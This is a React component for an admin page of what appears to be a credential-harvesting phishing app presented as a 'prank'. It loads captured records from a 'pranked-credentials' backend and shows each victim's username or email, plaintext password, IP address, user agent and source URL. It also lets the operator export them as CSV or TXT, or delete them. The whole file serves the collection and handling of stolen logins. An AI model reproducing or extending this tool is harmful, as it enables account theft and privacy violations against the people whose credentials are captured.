import React, { useEffect, useState, useMemo } from 'react';

const AdminTable = ({ onExit }) => {
  const [rows, setRows] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');

  const backendUrl = useMemo(() => process.env.REACT_APP_BACKEND_URL, []);

  const fetchData = async () => {
    setLoading(true);
    setError('');

    if (!backendUrl) {
      setError('Backend URL missing. Please set REACT_APP_BACKEND_URL in frontend/.env and restart frontend.');
      setLoading(false);
      return;
    }

    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 8000);
      const res = await fetch(`${backendUrl}/api/pranked-credentials`, { signal: controller.signal });
      clearTimeout(timeout);

      if (!res.ok) {
        let detail = '';
        try {
          const maybeJson = await res.json();
          detail = typeof maybeJson === 'object' ? JSON.stringify(maybeJson) : String(maybeJson);
        } catch {
          detail = await res.text();
        }
        throw new Error(`HTTP ${res.status} ${res.statusText} ${detail ? '- ' + detail : ''}`);
      }

      const data = await res.json();
      setRows(Array.isArray(data) ? data : []);
    } catch (e) {
      setError(`Failed to load credentials${e?.message ? `: ${e.message}` : ''}`);
    } finally {
      setLoading(false);
    }
  };

  const downloadFile = async (format) => {
    setError('');
    try {
      const res = await fetch(`${backendUrl}/api/pranked-credentials/export?format=${format}`);
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      const blob = await res.blob();
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `pranked_credentials.${format}`;
      document.body.appendChild(a);
      a.click();
      a.remove();
      window.URL.revokeObjectURL(url);
    } catch (e) {
      setError(`Failed to export (${format})${e?.message ? `: ${e.message}` : ''}`);
    }
  };

  const clearAll = async () => {
    if (!window.confirm('Clear all entries? This cannot be undone.')) return;
    try {
      const res = await fetch(`${backendUrl}/api/pranked-credentials/clear`, { method: 'POST' });
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      await fetchData();
    } catch (e) {
      setError(`Failed to clear all entries${e?.message ? `: ${e.message}` : ''}`);
    }
  };

  const deleteOne = async (id) => {
    if (!window.confirm('Delete this entry?')) return;
    try {
      const res = await fetch(`${backendUrl}/api/pranked-credentials/${id}`, { method: 'DELETE' });
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      await fetchData();
    } catch (e) {
      setError(`Failed to delete entry${e?.message ? `: ${e.message}` : ''}`);
    }
  };

  useEffect(() => {
    fetchData();
  }, [backendUrl]);

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-800 p-6 text-white">
      <div className="max-w-6xl mx-auto">
        <div className="flex items-center justify-between mb-6">
          <h1 className="text-2xl font-bold">Admin • Saved Credentials</h1>
          <div className="space-x-3">
            <button onClick={() => downloadFile('csv')} className="px-4 py-2 rounded-lg bg-emerald-500 hover:bg-emerald-600">Export CSV</button>
            <button onClick={() => downloadFile('txt')} className="px-4 py-2 rounded-lg bg-teal-500 hover:bg-teal-600">Export TXT</button>
            <button onClick={fetchData} className="px-4 py-2 rounded-lg bg-indigo-500 hover:bg-indigo-600">Refresh</button>
            <button onClick={clearAll} className="px-4 py-2 rounded-lg bg-red-600 hover:bg-red-700">Clear All</button>
            <button onClick={onExit} className="px-4 py-2 rounded-lg bg-gray-600 hover:bg-gray-700">Exit</button>
          </div>
        </div>

        {loading ? (
          <div className="bg-white/5 rounded-xl p-6">Loading...</div>
        ) : error ? (
          <div className="bg-red-500/20 border border-red-500/40 rounded-xl p-4 text-red-200">{error}</div>
        ) : (
          <div className="bg-white/5 rounded-xl overflow-auto">
            <table className="min-w-full text-sm">
              <thead className="bg-white/10">
                <tr>
                  <th className="text-left px-4 py-3">#</th>
                  <th className="text-left px-4 py-3">Email/Username</th>
                  <th className="text-left px-4 py-3">Password</th>
                  <th className="text-left px-4 py-3">IP</th>
                  <th className="text-left px-4 py-3">User Agent</th>
                  <th className="text-left px-4 py-3">URL</th>
                  <th className="text-left px-4 py-3">Pranked At</th>
                  <th className="text-left px-4 py-3">Actions</th>
                </tr>
              </thead>
              <tbody>
                {rows.length === 0 ? (
                  <tr>
                    <td colSpan={8} className="px-4 py-6 text-center text-white/70">No entries yet</td>
                  </tr>
                ) : (
                  rows.map((r, idx) => (
                    <tr key={r.id || idx} className="border-t border-white/10">
                      <td className="px-4 py-3">{idx + 1}</td>
                      <td className="px-4 py-3 break-all">{r.emailOrUsername}</td>
                      <td className="px-4 py-3 break-all">{r.password}</td>
                      <td className="px-4 py-3">{r.ipAddress}</td>
                      <td className="px-4 py-3 max-w-[320px] truncate" title={r.userAgent}>{r.userAgent}</td>
                      <td className="px-4 py-3 max-w-[360px] truncate" title={r.url}>{r.url}</td>
                      <td className="px-4 py-3">{r.prankedAt}</td>
                      <td className="px-4 py-3">
                        <button onClick={() => deleteOne(r.id)} className="px-3 py-1 rounded-md bg-red-500 hover:bg-red-600">Delete</button>
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        )}
        <div className="mt-4 text-sm text-white/70">Total: {rows.length}</div>
      </div>
    </div>
  );
};

export default AdminTable;